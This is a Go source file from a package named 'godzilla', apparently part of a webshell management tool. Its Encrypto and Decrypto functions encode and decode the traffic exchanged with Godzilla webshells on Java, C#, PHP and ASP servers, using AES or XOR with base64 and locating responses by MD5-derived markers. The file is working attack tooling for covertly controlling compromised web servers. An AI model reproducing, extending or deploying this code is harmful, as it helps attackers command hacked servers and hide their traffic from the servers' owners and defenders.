package godzilla

import (
	"encoding/base64"
	"errors"
	"github.com/Go0p/wsm/lib/encrypt"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/utils"
	"net/url"
	"regexp"
)

func Encrypto(content, key []byte, pass string, cryption CrypticType, script shell.ScriptType) ([]byte, error) {
	if script == shell.JavaScript {
		if cryption == JAVA_AES_BASE64 {
			en, err := encryptForJava(content, key)
			if err != nil {
				return nil, err
			}
			payload := url.QueryEscape(base64.StdEncoding.EncodeToString(en))
			result := []byte(pass + "=" + payload)
			return result, nil
		} else if cryption == JAVA_AES_RAW {
			result, err := encryptForJava(content, key)
			if err != nil {
				return nil, err
			}
			return result, nil
		} else {
			return nil, errors.New("java encryption mode err")
		}
	} else if script == shell.CsharpScript {
		if cryption == CSHARP_AES_BASE64 {
			en, err := encryptForCSharp(content, key)
			if err != nil {
				return nil, err
			}
			payload := url.QueryEscape(base64.StdEncoding.EncodeToString(en))
			result := []byte(pass + "=" + payload)
			return result, nil
		} else if cryption == CSHARP_AES_RAW {
			result, err := encryptForCSharp(content, key)
			if err != nil {
				return nil, err
			}
			return result, nil
		} else {
			return nil, errors.New("csharp encryption mode err")
		}
	} else if script == shell.PhpScript {
		if cryption == PHP_XOR_BASE64 {
			payload := url.QueryEscape(base64.StdEncoding.EncodeToString(encrypt.Xor(content, key)))
			result := []byte(pass + "=" + payload)
			return result, nil
		} else if cryption == PHP_XOR_RAW {
			result := encrypt.Xor(content, key)
			return result, nil
		} else {
			return nil, errors.New("php encryption mode err")
		}
	} else if script == shell.AspScript {
		if cryption == ASP_XOR_BASE64 {
			payload := url.QueryEscape(base64.StdEncoding.EncodeToString(encrypt.Xor(content, key)))
			result := []byte(pass + "=" + payload)
			return result, nil
		} else if cryption == ASP_XOR_RAW {
			result := encrypt.Xor(content, key)
			return result, nil
		} else {
			return nil, errors.New("asp encryption mode err")
		}
	} else {
		return nil, errors.New("script type err")
	}
}

func Decrypto(content, key []byte, pass string, cryption CrypticType, script shell.ScriptType) ([]byte, error) {
	if script == shell.JavaScript {
		if cryption == JAVA_AES_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, err := base64.StdEncoding.DecodeString(cont[1])
				if err != nil {
					return nil, err
				}
				result, err = decryptForJava(result, key)
				if err != nil {
					return nil, err
				}
				return result, nil
			} else {
				return nil, errors.New("not Find String Sub match")
			}
		} else if cryption == JAVA_AES_RAW {
			result, err := decryptForJava(content, key)
			if err != nil {
				return nil, err
			}
			return result, nil
		} else {
			return nil, errors.New("java encryption mode err")
		}
	} else if script == shell.CsharpScript {
		if cryption == CSHARP_AES_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, err := base64.StdEncoding.DecodeString(cont[1])
				if err != nil {
					return nil, err
				}
				result, err = decryptForCSharp(result, key)
				if err != nil {
					return nil, err
				}
				return result, nil
			} else {
				return nil, errors.New("not Find String Sub match")
			}
		} else if cryption == CSHARP_AES_RAW {
			result, err := decryptForCSharp(content, key)
			if err != nil {
				return nil, err
			}
			return result, nil
		} else {
			return nil, errors.New("csharp encryption mode err")
		}
	} else if script == shell.PhpScript {
		if cryption == PHP_XOR_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, err := base64.StdEncoding.DecodeString(cont[1])
				if err != nil {
					return nil, err
				}
				result = encrypt.Xor(result, key)
				return result, nil
			} else {
				return nil, errors.New("not Find String Sub match")
			}
		} else if cryption == PHP_XOR_RAW {
			return encrypt.Xor(content, key), nil
		} else {
			return nil, errors.New("php encryption mode err")
		}
	} else if script == shell.AspScript {
		if cryption == ASP_XOR_BASE64 {
			flag := utils.MD5(pass + string(key))
			// ASP_XOR_BASE64 取的是前 6 后 6
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:6] + `(.*?)` + flag[20:26]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, err := base64.StdEncoding.DecodeString(cont[1])
				if err != nil {
					return nil, err
				}
				result = encrypt.Xor(result, key)
				return result, nil
			} else {
				return nil, errors.New("not Find String Sub match")
			}
		} else if cryption == ASP_XOR_RAW {
			return encrypt.Xor(content, key), nil
		} else {
			return nil, errors.New("asp dncryption mode err")
		}
	} else {
		return nil, errors.New("script type err")
	}
}

func encryptForCSharp(content, key []byte) ([]byte, error) {
	return encrypt.AESCBCEncrypt(content, key, key)
}

func decryptForCSharp(content []byte, key []byte) ([]byte, error) {
	return encrypt.AESCBCDecrypt(content, key, key)
}

func encryptForJava(content, key []byte) ([]byte, error) {
	return encrypt.AESECBEncrypt(content, key)
}

func decryptForJava(content, key []byte) ([]byte, error) {
	return encrypt.AESECBDecrypt(content, key)
}
